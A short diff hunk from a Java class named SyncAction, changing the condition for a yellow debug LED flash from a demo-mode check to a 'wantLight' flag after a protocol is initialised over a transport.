@@ -93,7 +93,7 @@ public abstract class SyncAction extends SubActionMain {
                 protocol.init(transport);
 
                 try {
-                    if (Status.self().isDemo()) {
+                    if (Status.self().wantLight()) {
                         Debug.ledFlash(Debug.COLOR_YELLOW);
                     }
 
